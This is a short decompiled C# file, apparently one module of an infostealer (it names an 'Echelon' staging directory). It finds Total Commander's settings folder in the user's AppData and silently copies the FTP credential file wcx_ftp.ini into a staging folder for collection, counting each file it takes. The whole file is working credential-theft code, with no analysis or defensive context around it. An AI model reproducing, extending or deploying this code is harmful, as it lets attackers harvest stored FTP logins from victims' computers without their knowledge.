using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000052 RID: 82
	internal class TotalCommander
	{
		// Token: 0x0600022B RID: 555 RVA: 0x00010594 File Offset: 0x0000E794
		public static void GetTotalCommander(string Echelon_Dir)
		{
			try
			{
				string text = Help.AppDate + "\\GHISLER\\";
				if (Directory.Exists(text))
				{
					Directory.CreateDirectory(Echelon_Dir + "\\FTP\\Total Commander");
				}
				FileInfo[] files = new DirectoryInfo(text).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
						File.Copy(text + "wcx_ftp.ini", Echelon_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
						TotalCommander.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400011E RID: 286
		public static int count;
	}
}
